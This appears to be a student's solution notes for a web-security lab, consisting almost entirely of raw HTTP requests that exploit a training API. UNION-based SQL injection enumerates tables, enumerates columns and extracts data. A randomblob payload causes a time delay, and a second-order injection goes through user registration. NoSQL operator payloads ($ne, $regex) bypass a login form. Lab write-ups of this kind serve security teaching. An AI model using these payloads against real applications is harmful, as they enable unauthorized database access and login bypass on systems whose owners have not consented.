### Task 1:
Get the DBMS: 
- GET /api/a3/sql_injection/all_orders?status=5' UNION SELECT null,version(),null,null,null -- 
- GET /api/a3/sql_injection/all_orders?status=5%27%20UNION%20SELECT%20null%2Cversion()%2Cnull%2Cnull%2Cnull%20%2D%2D 
Enumerate tables: 
- GET /api/a3/sql_injection/all_orders?status=cancelled' UNION SELECT NULL,name,NULL,NULL,NULL,FROM sqlite_master WHERE type='table' -- HTTP/1.1
- GET /api/a3/sql_injection/all_orders?status=cancelled%27%20UNION%20SELECT%20NULL%2Cname%2CNULL%2CNULL%2CNULL%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20%2D%2D HTTP/1.1

### Task 2:
Enumerate columns from a specific table:
- GET /api/a3/sql_injection/all_orders?status=penfgfgding' UNION SELECT NULL,name,NULL,NULL,NULL FROM pragma_table_info('Orders') -- HTTP/1.1
- GET /api/a3/sql_injection/all_orders?status=penfgfgding%27%20UNION%20SELECT%20NULL%2Cname%2CNULL%2CNULL%2CNULL%20FROM%20pragma_table_info%28%27Orders%27%29%20-- HTTP/1.1
Extract data from a specific table:
- GET /api/a3/sql_injection/all_orders?status=peghnding%27%20UNION%20SELECT%20id%2Cvalue%2Cnull%2Cname%2Cnull%20FROM%20not_me%20%2D%2D HTTP/1.1
- GET /api/a3/sql_injection/all_orders?status=peghnding' UNION SELECT id,value,null,name,null FROM not_me -- HTTP/1.1

include columns from a table in question. And exact amount of columns from the original query

### Task 3
Get a delayed response: 
- GET /api/a3/sql_injection/all_orders?status=pending' AND 1=randomblob(100000000) -- HTTP/1.1
- GET /api/a3/sql_injection/all_orders?status=pending%27%20AND%201%3Drandomblob%28100000000%29%20%2D%2D HTTP/1.1

### Task 4: 

Intercept any request and send to repeater. Edit the request. Make sure to use http on port 80. 

POST /api/a3/sql_injection/second_order/register HTTP/1.1
Host: web0x01.hbtn
Content-Type: application/json
Content-Length: 65

{"username": "yosri", "name": "Yosri", "password": "password123"}

POST /api/a3/sql_injection/second_order/register HTTP/1.1
Host: web0x01.hbtn
Content-Type: application/json
Content-Length: 97

{"username": "scottyscott6", "name": "ScottyScott' AND {{ FLAG }} --", "password": "password123"}


POST /api/a3/sql_injection/second_order/login HTTP/1.1
Host: web0x01.hbtn
Content-Type: application/json
Content-Length: 56

{"username":  "scottyscott6", "password": "password123"}


### Task 6


POST /api/a3/nosql_injection/sign_in HTTP/1.1
Host: web0x01.hbtn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://web0x01.hbtn/a3/nosql_injection/
content-type: application/json
Content-Length: 58
Origin: http://web0x01.hbtn
Connection: close
Cookie: session=flsDprGUrMIzTGtbI4U0nwq8uToKw3ZTbPlzi9J2Tmo.6OAsWb3t0LSaEqUddiuEjDSjY1o

{
"username":   {"$ne":null},
"password":{"$ne":null}
}



### Task 7 
POST /api/a3/nosql_injection/sign_in HTTP/1.1
Host: web0x01.hbtn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://web0x01.hbtn/a3/nosql_injection/
content-type: application/json
Content-Length: 61
Origin: http://web0x01.hbtn
Connection: close
Cookie: session=flsDprGUrMIzTGtbI4U0nwq8uToKw3ZTbPlzi9J2Tmo.6OAsWb3t0LSaEqUddiuEjDSjY1o

{
"username":   {"$regex":"^e"},
"password":{"$ne":null}
}


